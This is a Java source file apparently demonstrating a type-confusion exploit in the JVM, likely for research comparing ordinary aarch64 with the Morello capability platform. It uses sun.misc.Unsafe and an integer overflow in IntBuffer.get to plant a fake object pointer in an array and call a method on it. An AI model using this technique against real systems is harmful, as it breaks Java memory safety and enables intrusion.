package TypeConfusionDemo;

import org.openjdk.jol.vm.VM;

import java.nio.ByteBuffer;
import java.nio.IntBuffer;
import java.util.Arrays;
import java.lang.reflect.Field;
import sun.misc.Unsafe;

public class TypeConfusionDemo {
  public static int offset = 999999999; // overflow -294967276 on aarch64
  public static int length = 2;
  private static Unsafe unsafe;
  public RealClass[] realClassArray;
  public int[] dst;
  public IntBuffer ib;
  public FakeClass fakeClass;

  public TypeConfusionDemo() throws java.lang.NoSuchFieldException, IllegalAccessException, Exception {
    unsafe = DemoHelper.getUnsafe();
    if (unsafe.addressSize() == 16) {
      throw new Exception("Cannot run TypeConfusion on Morello");
    }
    realClassArray = new RealClass[125000000];
    dst = DemoHelper.init_array(1209098507, 0xA2A2A2A2);
    ib = DemoHelper.init_int_buffer(400, get_compressed_oop());
  }
  
  public void demo() {
    write_fakeclass_to_realclassarray();
    checkOverflow();
  }

  public void checkOverflow() {
    // overflow to -294967276/4
    int dstOverflow = -294967276/4;
    for (int i = (dstOverflow - 5); i < (dstOverflow + 5); i++ ) {
      RealClass realClass = realClassArray[realClassArray.length + i];
      realClass.foo(7); 
    }
  }

  public static int get_compressed_oop() {
    FakeClass[] helperArray = new FakeClass[1];
    helperArray[0] = new FakeClass(1);
    long baseOffset = unsafe.arrayBaseOffset(FakeClass[].class);
    return (int) unsafe.getLong(helperArray, baseOffset);
  }

  public RealClass[] write_fakeclass_to_realclassarray() {
    System.out.println("realClassArray memory address = " + VM.current().addressOf(realClassArray));
    Arrays.fill(realClassArray, new RealClass(-1));
    ib.get(dst, offset, length);
    return realClassArray;
  }
}
